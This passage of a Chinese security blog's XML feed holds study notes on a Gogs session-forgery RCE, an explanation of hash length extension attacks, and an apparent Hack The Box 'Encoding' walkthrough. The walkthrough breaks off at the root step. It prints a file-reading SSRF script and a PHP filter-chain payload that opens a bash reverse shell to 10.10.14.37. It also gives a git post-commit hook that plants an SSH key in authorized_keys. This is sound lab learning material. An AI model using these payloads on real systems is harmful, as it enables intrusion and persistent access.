+<li><a href="https://www.youtube.com/watch?v=UiBtz7rZ6Ec&amp;list=TLPQMzEwNTIwMjM7GmfPJ2mZbg&amp;index=2">https://www.youtube.com/watch?v=UiBtz7rZ6Ec&amp;list=TLPQMzEwNTIwMjM7GmfPJ2mZbg</a></li>
+<li><a href="https://www.jetbrains.com/help/idea/creating-and-running-your-first-restful-web-service.html#new_project">https://www.jetbrains.com/help/idea/creating-and-running-your-first-java-ee-application.html#source_code</a></li>
+<li><a href="https://juejin.cn/post/7000950677409103880">https://juejin.cn/post/7000950677409103880</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ Gogs RCE 历史漏洞学习笔记]]></title>
+        <id>https://1dayluo.github.io/post/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji/</id>
+        <link href="https://1dayluo.github.io/post/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji/">
+        </link>
+        <updated>2023-05-25T11:23:23.000Z</updated>
+        <content type="html"><![CDATA[<aside>
+💡 This exercise covers how to get code execution against the Git self hosted tool: Gogs.
+</aside>
+<p>备注: gogs的老漏洞学习,非最新的.靶场学习的, 里面提供了复现环境,就不用自己搭建了.</p>
+<h2 id="概括">概括</h2>
+<p>gogs是一种提供能自己服务器上搭建git服务的开源项目,即自助git</p>
+<p>gogs的攻击分为两步:</p>
+<ol>
+<li>绕过验证变为administrator</li>
+<li>使用hook获取命令执行rce</li>
+</ol>
+<h2 id="漏洞分析学习">漏洞分析学习</h2>
+<p>分析主要是看Reference里的文章, 大佬文章写的足够详细了, 我就简单记录一下跟着文章捋的思路和自己的一些梳理. 建议还是看原文, 有更详细的代码分析(学习时写自己的思路笔记才有助于理解不是吗)</p>
+<h3 id="修复的关键代码">修复的关键代码:</h3>
+<pre><code class="language-go">// Read returns raw session store by session ID.
+func (m *Manager) Read(sid string) (RawStore, error) {
+    // No slashes or dots &quot;./&quot; should ever occur in the sid and to prevent session file forgery bug.
+    // See https://github.com/gogs/gogs/issues/5469
+    if strings.ContainsAny(sid, &quot;./&quot;) {
+        return nil, errors.New(&quot;invalid 'sid': &quot; + sid)
+    }
+
+    return m.provider.Read(sid)
+}
+</code></pre>
+<p>利用条件:</p>
+<ol>
+<li>Gogs的配置文件指定session存储方式为文件</li>
+<li>后台逻辑(session.go)没有考虑到过滤 <code>../</code> 等字符</li>
+<li><code>i_like_gogits</code> 可以加载任意文件的内容(同2)</li>
+</ol>
+<p>其中:</p>
+<ul>
+<li>cookie中 <code>i_like_gogits</code> 为对应session文件的文件名, 这里可以改为管理员的session</li>
+</ul>
+<p>而其中session的信息需要人为构造并且找到一个上传点</p>
+<h3 id="人为构造session">人为构造session:</h3>
+<p>session生成是由 <code>EncodeGob</code> 解码则是通过 <code>DecodeGob</code> ,解码对应session然后修改里面的uid为管理员uid和uname, 再由EncodeGob编码.</p>
+<ul>
+<li>encoding session的代码</li>
+</ul>
+<pre><code class="language-go">func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+    for _, v := range obj {
+        gob.Register(v)
+    }
+    buf := bytes.NewBuffer(nil)
+    err := gob.NewEncoder(buf).Encode(obj)
+    return buf.Bytes(), err
+}
+</code></pre>
+<p>User 结构体(<a href="https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/user.go#L50-L52">https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/user.go#L50-L52</a>)</p>
+<pre><code class="language-go">type User struct {
+    ID        int64
+    LowerName string `xorm:&quot;UNIQUE NOT NULL&quot;`
+    Name      string `xorm:&quot;UNIQUE NOT NULL&quot;`
+    FullName  string
+</code></pre>
+<p>获取session的代码(<a href="https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/routes/user/auth.go#L127-L128">routes/user/auth.go</a>) 涉及到用户身份的有两个值</p>
+<pre><code class="language-go">c.Session.Set(&quot;uid&quot;, u.ID)
+c.Session.Set(&quot;uname&quot;, u.Name)
+</code></pre>
+<h3 id="上传点">上传点</h3>
+<p>Gogs提供了三种方式在服务器上传:</p>
+<ul>
+<li>使用issue tracker提供的上传功能 :</li>
+<li>用git push : 但是受限上传文件类型/内容过滤</li>
+<li>使用upload file在给定repository</li>
+<li></li>
+</ul>
+<p>这里用upload file为例子,当你创建repo的拷贝后, Gogs会将文件放在 <code>/data/gogs/data/tmp/local-repo/[REPO_ID]/[FILENAME]</code> 里, 这里repo_id可以在fork的时候查看链接(链接里子目录名), 对应<a href="https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/repo.go#L594-L596">代码</a>. 这里session默认存储路径为 <code>/**data/gogs/data/sessions/</code> *</p>
+<p>构造即在<code>i_like_gogits</code> 中将文件指向相对路径即可</p>
+<figure data-type="image" tabindex="1"><img src="https://i.imgur.com/H7FyjSv.png" alt="" loading="lazy"></figure>
+<h3 id="登录后利用">登录后利用</h3>
+<p>用的git的hook功能. 实现RCE</p>
+<p>git hook以前刷题用到过,见 <a href="https://1dayluo.github.io/post/htbencoding/#git-commitsh">https://1dayluo.github.io/post/htbencoding/#git-commitsh</a><br>
+这里注意看仓库设置里Gogs支持的hook,  我在复现的时候就发现了靶场不支持post-commit的hook</p>
+<h2 id="反思">反思</h2>
+<p>这个漏洞是经典的session管理和文件目录遍历结合的洞, 学习组合拳什么的…包括代码审计遇到类似的也可以(gogs的session管理和php的session管理是一样的机制)</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/163575">https://www.anquanke.com/post/id/163575</a></li>
+<li>Pentesterlab: Green</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Length Extension Attack]]></title>
+        <id>https://1dayluo.github.io/post/length-extension-attack/</id>
+        <link href="https://1dayluo.github.io/post/length-extension-attack/">
+        </link>
+        <updated>2023-05-22T21:16:32.000Z</updated>
+        <content type="html"><![CDATA[<p>关键词:MD5, SHA-1,Length Extension Attack</p>
+<h2 id="outline">Outline</h2>
+<p>网站通常会hash对应的secret以防止被篡改。而Length extension attack是指攻击者使用已知hash值的长度和hash算法类型，构造出新的有效hash值，而<strong>无需知道</strong>原始数据的内容。攻击成功后，攻击者可以向hash后的数据追加新的数据并重新计算hash值，而该hash值仍将保持有效。这种攻击通常会影响使用MD5和SHA-1等算法的网站。</p>
+<p>备注:</p>
+<ul>
+<li>可以通过data长度判断加密方式,例如128可能是MD5(it's the most common 128-bit hashing algorithm)</li>
+</ul>
+<h2 id="基础">基础</h2>
+<p>首先要对散列函数的基础概念有所了解.散列函数具有以下特性:</p>
+<ol>
+<li>散列函数的运算过程是不可逆的，这个称为散列函数的单向性。</li>
+<li>对于一个已知的消息及其散列值，要找到另外一个消息使其获得相同的散列值是不可能的，这个特性称为散列函数的弱碰撞性。这个特性可以用来防止消息伪造。</li>
+<li>任意两个不同消息的散列值一定不同。</li>
+<li>对原始消息长度没有限制。</li>
+</ol>
+<p>还有加密过程也是前置知识.</p>
+<h2 id="构造过程">构造过程</h2>
+<p>加密函数如下：</p>
+<pre><code class="language-php">HASH([SECRET][DATA])
+</code></pre>
+<p>攻击者则需要通过以下方式去计算</p>
+<pre><code class="language-php">HASH([SECRET][DATA][PADDING][SUFFIX])
+</code></pre>
+<p>其中secret为用于保护signature的secret，data为signed后的字符串</p>
+<p>攻击者需要知道对应的[SECRET]的size，以及[DATA]从而计算[PADDING]</p>
+<p>类似于CBC(我是说将第一次生成的结果作为下一次输入的一部分) 这里的长度攻击是从中间状态继续进行hash计算.</p>
+<p>具体的方式如下(总结自<a href="https://github.com/iagox86/hash_extender">github</a>),先假设前提:</p>
+<figure data-type="image" tabindex="1"><img src="https://i.imgur.com/RPMarJU.png" alt="Untitled" loading="lazy"></figure>
+<p>首先,服务器有一个初始的输入<code>secretdata</code>,并计算了其MD5 hash值:</p>
+<pre><code>6ee582a1669ce442f3719c47430dadee
+</code></pre>
+<p>然后,攻击者想在<code>secretdata</code>后面追加<code>append</code>,并伪造<code>secretdataappend</code>的hash值,以骗过服务器。但是攻击者不知道<code>secret</code>的值。那么如何计算<code>secretdataappend</code>的hash值呢?攻击者的方法是:</p>
+<ol>
+<li>
+<p>已知<code>secretdata</code>的hash值<code>6ee582a1669ce442f3719c47430dadee</code>。这是MD5函数计算完成后的状态。</p>
+</li>
+<li>
+<p>攻击者创建一个新的MD5上下文,并设置其初始状态为上一步得到的状态。这样,这个上下文就像是在<code>secretdata</code>后继续运行的。</p>
+</li>
+<li>
+<p>攻击者在这个上下文中再hash <code>append</code> 得到的hash值就是<code>secretdataappend</code>的hash值。</p>
+</li>
+<li>
+<p>攻击者可以将<code>dataappend</code>和伪造的hash值发送给服务器。服务器会在前面加上<code>secret</code>,计算hash值,得到的结果和攻击者一致,于是就被欺骗了。所以这个攻击的关键就是利用了MD5的长度扩展性质:知道一个hash值,可以继续从那个状态开始hash更长的输入。这就是所谓的长度扩展攻击。</p>
+</li>
+</ol>
+<h3 id="举例">举例</h3>
+<p>引用wiki的例子, 例如:</p>
+<pre><code class="language-php">Original Data: count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo
+Original Signature: 6d5f807e23db210bc254a28be2d6759a0f5f5d99
+</code></pre>
+<p>这个请求负责将10个类型为eggo的waffle运送到user_id为1的用户所指定的位置,当且仅当signature对用户来说是有效的.</p>
+<p>可以设计成以下:</p>
+<pre><code class="language-php">Desired New Data: count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&amp;waffle=liege
+</code></pre>
+<p>这里message在遇到重复会优先选择最后一个waffle的值</p>
+<p>在长度攻击这里,可以将hash(上面的 <code>signature</code> ) 作为hashing function的状态输入, 并继续原来得请求.这里原始key(<code>count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo</code>)的长度是14, 可以伪造请求长度看服务器接受哪个长度.构造新的数据:</p>
+<pre><code class="language-php">New Data: count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00
+          \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+          \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+          \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+          \x00\x00\x00\x02\x28&amp;waffle=liege
+</code></pre>
+<p>在这里DATA后跟着PADDING,然后SUFFIX为 <code>&amp;waffle=liege</code></p>
+<p>其中 <code>0x80</code> 为128 为原始长度.这里大多数算法包括MD4,MD5,RIPEMD-160,SHA-0,SHA-1,SHA-256都是string+padding直到长度为56 bytes(mod 64)然后再加一个8 bytes 的encoded 长度字段的大小端/an 8-byte little-endian length</p>
+<p>这里80 00 00 …. 作为PADDING部分.</p>
+<p>这里我觉得wiki的解释里的例子不太好,见github这个利用脚本的README里的讲解吧(https://github.com/iagox86/hash_extender)</p>
+<h2 id="工具">工具</h2>
+<p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
+<p><code>git clone</code> 到本地后用makefile自动化编译.如果make报错的话需要从Makefile里移除 <code>Werror</code></p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Length_extension_attack">https://en.wikipedia.org/wiki/Length_extension_attack</a></li>
+<li>Pentesterlab：Green</li>
+<li>https://github.com/iagox86/hash_extender</li>
+<li><a href="https://m.freebuf.com/articles/database/137129.html">https://m.freebuf.com/articles/database/137129.html</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ HTB：Encoding]]></title>
+        <id>https://1dayluo.github.io/post/htbencoding/</id>
+        <link href="https://1dayluo.github.io/post/htbencoding/">
+        </link>
+        <updated>2023-04-23T10:14:17.000Z</updated>
+        <content type="html"><![CDATA[<p>标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service</p>
+<p>………慢慢来，不要着急。打退役box积攒经验中…</p>
+<h2 id="recon">Recon</h2>
+<p>探索了下页面，又看了下标题其实感觉主要是页面内提供Encoding功能的API，不过这个只是猜测</p>
+<p><strong>端口扫描</strong></p>
+<p>端口扫描没收获也大概证实了一下这个猜想（？ 只有 <code>80</code>, <code>22</code></p>
+<p><strong>目录爆破</strong></p>
+<p>用feroxbuster</p>
+<pre><code class="language-json">[####################] - 10m    60021/60021   0s      found:8       errors:633    
+[####################] - 10m    30000/30000   47/s    http://10.10.11.198/ 
+[####################] - 7m     30000/30000   64/s    http://10.10.11.198/includes/ 
+[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/js/ =&gt; Directory listing
+[####################] - 1s     30000/30000   0/s     http://10.10.11.198/assets/ =&gt; Directory listing
+[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/img/ =&gt; Directory listing
+[####################] - 0s     30000/30000   0/s     http://10.10.11.198/assets/css/ =&gt; Directory listing
+</code></pre>
+<p><strong>子域名扫描</strong></p>
+<p><code>wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u [http://haxtables.htb](http://haxtables.htb/) -H &quot;Host:FUZZ.haxtables.htb&quot; --hc 302,400,404 --hw 137</code></p>
+<p>这里前期发现会有误报，所以需要加一个 <code>--hw 137</code>的选项</p>
+<pre><code class="language-php">=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                     
+=====================================================================
+
+000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                                                                                                                                                                       
+000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;
+</code></pre>
+<p><strong>网站探索</strong></p>
+<p>页面探索了以下，功能点的路径如下，(请求体下的 <code>uri_path</code> 为对应的api地址，感觉后续可以利用)：</p>
+<pre><code class="language-bash">http://10.10.11.198/handler.php
+</code></pre>
+<p>然后是涉及api的子域名（相关介绍在http://10.10.11.198/index.php?page=api）：</p>
+<pre><code class="language-bash">http://api.haxtables.htb/
+</code></pre>
+<p>记得将上述提到的域名添加到hosts文件中</p>
+<h2 id="api">API</h2>
+<h3 id="文档阅读">文档阅读</h3>
+<p>文档里写的是 <code>POST</code> 请求：</p>
+<ul>
+<li>string类型：<code>http://api.haxtables.htb/v3/tools/string/index.php</code></li>
+<li>int类型： <code>http://api.haxtables.htb/v3/tools/integer/index.php</code></li>
+</ul>
+<p>此外，string和int除了支持json构造请求体（如下）：</p>
+<pre><code class="language-json">json_data = {
+        'action': 'dec2bin,
+        'data': 'str or int',
+    }
+</code></pre>
+<p>还支持指定本地文件or文件url的形式对文件进行转换</p>
+<p>文件上传的功能测试</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423.png" alt="20230423" loading="lazy"></figure>
+<h3 id="目录爆破">目录爆破</h3>
+<p><code>feroxbuster -u [http://api.haxtables.htb](http://api.haxtables.htb/) -x php -m GET,POST</code></p>
+<pre><code class="language-json">[####################] - 30m   420066/420066  0s      found:45      errors:20056  
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/ 
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v2/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/ 
+[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v3/ =&gt; Directory listing
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v3/tools/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/integer/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v3/tools/string/ 
+[####################] - 0s     60000/60000   0/s     http://api.haxtables.htb/v1/ =&gt; Directory listing
+[####################] - 1s     60000/60000   0/s     http://api.haxtables.htb/v1/tools/ =&gt; Directory listing
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/string/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v1/tools/integer/ 
+[####################] - 15m    60000/60000   63/s    http://api.haxtables.htb/v2/tools/string/
+</code></pre>
+<p>除了版本不同，功能点是一样得差不多</p>
+<h2 id="source-code-git">source-code &amp; git</h2>
+<h3 id="源代码阅读">源代码阅读</h3>
+<p>尝试指定文件路径进行encoding的功能点，构造对应的exp：</p>
+<pre><code class="language-python">import requests
+
+def get_file(file):
+    data = {
+        'action': 'str2hex',
+        'file_url': f&quot;file://{file}&quot;
+    }
+    http_proxy = {'http': 'http://127.0.0.1:8080'}
+    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data,proxies=http_proxy)
+    return response.json()[&quot;data&quot;]
+
+def hex2str(data):
+    json_data = {
+    'action': 'hex2str',
+    'data': f'{data}',
+    }
+    http_proxy = {'http': 'http://127.0.0.1:8080'}
+    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data,proxies=http_proxy)
+    print(response.json()[&quot;data&quot;])
+
+file = &quot;/etc/passwd&quot;    # 改成对应地址
+data = get_file(file)
+hex2str(data)
+</code></pre>
+<p>可以获取到</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_1.png" alt="20230423" loading="lazy"></figure>
+<p>稍微改写了一下，遍历然后输出</p>
+<pre><code class="language-python">files = [&quot;/etc/passwd&quot;, &quot;/var/www/html/index.php&quot;,&quot;/var/www/html/handler.php&quot;]
+for file in files:
+    data = get_file(file)
+    file_content = hex2str(data)
+    file_name = file.split('/')[-1]
+    print(file_name)
+    with open(f'{file_name}', 'a') as f:
+        f.write(file_content)
+</code></pre>
+<p>然后看 <code>handler.php</code> 下的内容</p>
+<pre><code class="language-python">&lt;?php
+include_once '../api/utils.php';
+
+if (isset($_FILES['data_file'])) {
+    $is_file = true;
+    $action = $_POST['action'];
+    $uri_path = $_POST['uri_path'];
+    $data = $_FILES['data_file']['tmp_name'];
+
+} else {
+    $is_file = false;
+    $jsondata = json_decode(file_get_contents('php://input'), true);
+    $action = $jsondata['action'];
+    $data = $jsondata['data'];
+    $uri_path = $jsondata['uri_path'];
+
+    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
+    {
+        echo jsonify(['message' =&gt; 'Insufficient parameters!']);
+        // echo jsonify(['message' =&gt; file_get_contents('php://input')]);
+
+    }
+
+}
+
+$response = make_api_call($action, $data, $uri_path, $is_file);
+echo $response;
+
+?&gt;
+</code></pre>
+<p>提取 <code>../api/utils.php</code> 的内容,</p>
+<pre><code class="language-php">&lt;?php
+
+// Global functions
+
+function jsonify($body, $code = null)
+{
+    if ($code) {
+        http_response_code($code);
+    }
+
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($body);
+
+    exit;
+}
+
+function get_included_contents($filename) {
+    ob_start();
+    include $filename;
+    return ob_get_clean();
+}
+
+function get_url_content($url){
+    $domain = parse_url($url, PHP_URL_HOST);
+    if (gethostbyname($domain) === &quot;127.0.0.1&quot;) {
+	jsonify([&quot;message&quot; =&gt; &quot;Unacceptable URL&quot;]);
+    }
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
+    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+    $url_content =  curl_exec($ch);
+    curl_close($ch);
+    return $url_content;
+}
+
+function make_api_call($action, $data, $uri_path, $is_file = false){
+    if ($is_file) {
+        $post = [
+            'data' =&gt; file_get_contents($data),
+            'action' =&gt; $action,
+            'uri_path' =&gt; $uri_path
+        ];
+    } else {
+        $post = [
+            'data' =&gt; $data,
+            'action' =&gt; $action,
+            'uri_path' =&gt; $uri_path
+        ];
+    }
+    
+    $ch = curl_init();
+    $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
+    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
+    curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
+    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+    
+    
+}
+
+?&gt;
+</code></pre>
+<p>在这里 <code>gethostbyname($domain) === &quot;127.0.0.1&quot;</code> 用于判断给出的 <code>$domain</code> 是否指向本地</p>
+<p>访问 <code>image.haxtables.htb</code> 是403,然后试着用刚刚写的那个py去看下 <code>/var/www/image/index.php</code></p>
+<pre><code class="language-php">&lt;?php 
+
+include_once 'utils.php';
+
+include 'includes/coming_soon.html';
+
+?&gt;
+</code></pre>
+<p>看了一下comming_soon.html也没什么东西，但是 <code>utils.php</code> 里看到了关键得内容</p>
+<pre><code class="language-php">function git_status()
+{
+    $status = shell_exec('cd /var/www/image &amp;&amp; /usr/bin/git status');
+    return $status;
+}
+
+function git_log($file)
+{
+    $log = shell_exec('cd /var/www/image &amp;&amp; /ust/bin/git log --oneline &quot;' . addslashes($file) . '&quot;');
+    return $log;
+}
+
+function git_commit()
+{
+    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
+    return $commit;
+}
+</code></pre>
+<h3 id="git">.git</h3>
+<p>在 <code>[git-commit.sh](http://git-commit.sh)</code> 下看到了 <code>/var/www/image/.git</code></p>
+<p>这里用git-dumper有点麻烦是，得本地提供一个服务去获取远程主机的。这里我用FastAPI～ 起到一个反向代理的作用。参考了：<a href="https://github.com/tiangolo/fastapi/issues/1788">https://github.com/tiangolo/fastapi/issues/1788</a> 下的方案写出的。本来以为FastAPI对于写API来说会比较方便，实现了这个却发现或许Flask会好点。</p>
+<p>这里新建了一个proxy.py</p>
+<pre><code class="language-python">import requests
+from fastapi import FastAPI, Response, Request
+from requests import get
+import httpx
+import json
+import binascii
+
+app = FastAPI()
+
+@app.get('/{path:path}')
+async def get_file(request: Request, response: Response):
+    path = request.url.path[1:]
+    print(path)
+    send_uri = 'http://api.haxtables.htb/v3/tools/string/index.php'
+    data = {
+        'action': 'str2hex',
+        'file_url': f&quot;file:///{path}&quot;
+    }
+    async with httpx.AsyncClient() as client:
+        proxy = await client.post('http://api.haxtables.htb/v3/tools/string/index.php', json=data)
+    body = binascii.unhexlify(json.loads(proxy.content)['data'])
+    response.body = body
+    response.status_code = proxy.status_code
+    return response
+</code></pre>
+<p>然后用 <code>uvicorn</code> 命令 <code>uvicorn proxy:app --reload</code> 此时反向代理的服务提供在8000</p>
+<p>然后使用 <code>git-dumper</code> 去获取对应的git仓库的内容：</p>
+<p><code>git-dumper [http://127.0.0.1:8000/var/www/image/.git](http://127.0.0.1:8000/var/www/image/.git) git-dumper/</code></p>
+<p>探索目录，目前为止发现比较有用的就是 <code>action_handler.php</code> 下的内容：</p>
+<pre><code class="language-python">&lt;?php
+
+include_once 'utils.php';
+
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+    include($page);
+
+} else {
+    echo jsonify(['message' =&gt; 'No page specified!']);
+}
+
+?&gt;
+</code></pre>
+<p>访问对应的url地址： <code>http://image.haxtables.htb/actions/action_handler.php</code> 发现是403</p>
+<h2 id="uri">URI</h2>
+<h3 id="构造-handlerphp请求">构造 handler.php请求</h3>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_2.png" alt="20230423" loading="lazy"></figure>
+<p>根据URI的结构，刚刚<code>../api/utils.php</code> 的代码下的函数 <code>make_api_call</code> 的内容：</p>
+<pre><code class="language-python"> $url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
+</code></pre>
+<p>可以通过构造 <code>$uri_path</code> 的格式为 <code>@&lt;ip&gt;#</code> 来使服务器请求发送至 <code>&lt;ip&gt;</code> 而不是前者</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_3.png" alt="20230423" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_4.png" alt="20230423" loading="lazy"></figure>
+<h3 id="构造poc">构造poc</h3>
+<p>用 https://github.com/synacktiv/php_filter_chain_generator 来构造..（备注：留坑，自己完了康康代码实现吧）</p>
+<pre><code class="language-python">python php_filter_chain_generator.py  --chain '&lt;?php system(&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.37/2333 0&gt;&amp;1 \&quot;&quot;); ?&gt;'
+</code></pre>
+<p>然后在 <a href="http://10.10.11.198/handler.php"><code>http://10.10.11.198/handler.php</code></a> 上发起请求，其中 <code>@image.haxtables.htb/actions/action_handler.php?page=</code> page后参数为生成的poc，这里是任意文件包含的入口点</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_5.png" alt="20230423" loading="lazy"></figure>
+<h2 id="shell-as-www-data">shell as www-data</h2>
+<p>nc连上后还是按照惯例进行upgrade shell</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_6.png" alt="20230423" loading="lazy"></figure>
+<p>然后 <code>sudo -l</code> 查看权限</p>
+<pre><code class="language-python">www-data@encoding:~$ sudo -l 
+sudo -l
+Matching Defaults entries for www-data on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on encoding:
+    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+</code></pre>
+<h3 id="git-commitsh">git-commit.sh</h3>
+<p>看 <code>[git-commit.sh](http://git-commit.sh)</code> 的内容</p>
+<pre><code class="language-python">#!/bin/bash
+
+u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)
+
+if [[ $u ]]; then
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
+else
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m &quot;Commited from API!&quot; --author=&quot;james &lt;james@haxtables.htb&gt;&quot;  --no-verify
+fi
+</code></pre>
+<p>阅读这段代码，第一行前面是指定各种路径的参数。参考<a href="https://git-scm.com/docs/git-ls-files">https://git-scm.com/docs/git-ls-files</a>， <code>ls-files -o</code> 则是列出untracked的路径和文件列表。整体阅读，即新变动的代码会自动add，否则commit</p>
+<p>看对应的 <code>/var/www/image</code> 目录：</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_7.png" alt="20230423" loading="lazy"></figure>
+<p>这里 <code>x+</code> 表示有扩展属性。用getfacl命令查看：</p>
+<pre><code class="language-python">user::rwx
+user:www-data:rwx
+group::r-x
+mask::rwx
+other::r-x
+</code></pre>
+<p>但除了 <code>.git</code> 目录外，就没有其他可写入的地方了，但git-commit.sh 却支持我们add以及commit.这里试图用git来做一些绕过。这里有两种方法，一种是hook的方法(<a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90">https://git-scm.com/book/zh/v2/自定义-Git-Git-钩子</a>)， 一种是attribute的方法（<a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes">https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes</a> 用了filter指定可执行文件）。这里我先用hook的方法。</p>
+<h2 id="user-flagpost-commit-hook">User Flag：post-commit hook</h2>
+<p>这里我们用post-commit</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_4/20230423_8.png" alt="20230423" loading="lazy"></figure>
+<ol>
+<li>在 <code>/tmp</code> 目录下用ssh-keygen新生成一对 <code>ssh-keygen -t ed25519 -f htb  -C &quot;me@htb&quot;</code></li>
+<li>新增一个hook（记得给post-commit修改对应权限 <code>chmod +x .git/hooks/post-commit</code>）</li>
+</ol>
+<pre><code class="language-python">echo -e 'mkdir -p /home/svc/.ssh\necho &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLhHmaOAjmhtwqsT4hfOlcO1WiZFYbyoAAxsYb+EzkV me@htb&quot; &gt;&gt; /home/svc/.ssh/authorized_keys\nchmod 600 /home/svc/.ssh/authorized_keys' | tee .git/hooks/post-commit
+</code></pre>
+<ol>
+<li>制造触发post-commit条件：创建一个文件变动。这里用： <code>git --work-tree /tm个p/ add /tmp/qwe</code></li>
+<li>用svc用户身份执行命令，触发post-commit： <code>sudo -u svc /var/www/image/scripts/git-commit.sh</code></li>
+<li><code>ssh -i /tmp/htb svc@haxtables.htb</code>  拿到user flag</li>
+</ol>
+<h2 id="root-flag">Root Flag</h2>
+<p>查看已有权限：</p>
+<pre><code class="language-python">svc@encoding:~$ sudo -l
+sudo -l
+Matching Defaults entries for svc on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart 
+</code></pre>
